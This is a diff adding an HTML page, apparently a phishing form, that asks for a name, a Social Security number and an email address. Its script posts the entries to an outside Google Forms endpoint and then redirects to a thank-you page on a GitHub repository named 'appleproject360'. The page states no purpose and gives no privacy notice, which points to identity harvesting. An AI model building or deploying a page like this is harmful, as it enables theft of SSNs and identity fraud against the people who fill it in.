@@ -1,0 +1,65 @@
+
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js">
+</script>
+<script>
+function postContactToGoogle() {
+var Name=$('#Name').val();
+var SSN=$('#SSN').val();
+var Email=$('#Email').val();
+$.ajax({
+url:"https://docs.google.com/forms/d/e/1FAIpQLSfhaGcweShJOE-dlkSY07YjLJo8zSsqmrHDP-3GOetII6i4nQ/formResponse",data:{"entry_1923063817":Name,"entry_1888621226":SSN,"entry_1677061960":Email},type:"POST",dataType:"xml",statusCode: {0:function() { window.location.replace("http://htmlpreview.github.io/?https://github.com/project3601/appleproject360.github.io/blob/master/Thankyou");},200:function(){window.location.replace("http://htmlpreview.github.io/?https://github.com/project3601/appleproject360.github.io/blob/master/Thankyou");}}
+});
+}
+</script>
+<style>
+.FormRequest {
+background: lightyellow;
+width:400px;
+height:250px;
+border:1px solid blue;
+border-radius:10px 10px 10px 10px;
+}
+.FormRequest #formRequest{
+margin-left:20px;
+font-family:consolas;
+color: blue;
+}
+.FormRequest #formRequest input[type="button"],input[type="reset"]{
+border:1px solid green;
+background: darkred;
+color:white;
+border-radius:3px 3px 3px 3px;
+}
+</style>
+</head>
+<body bgcolor="silver">
+
+<table  class="FormRequest" align="center">
+<tr><td>
+<form id="formRequest">
+
+
+NAME:
+<input type="text" name="Name" id="Name" placeholder="Name" /><br/>
+
+SSN:
+<input type="text" name="SSN" id="SSN" placeholder="FSSN" /><br/>
+
+Email:
+<input type="text" name="Email" id="Email" maxlength="30" placeholder="Email" /><br/>
+
+<center>
+<input type="button" name="Submit" id="Submit" onclick="postContactToGoogle()" value="Submit"/>
+<input type="reset" value="Reset"/>
+</center>
+
+
+</form>
+
+</td></td>
+</table>
+
+</body>
+</html>
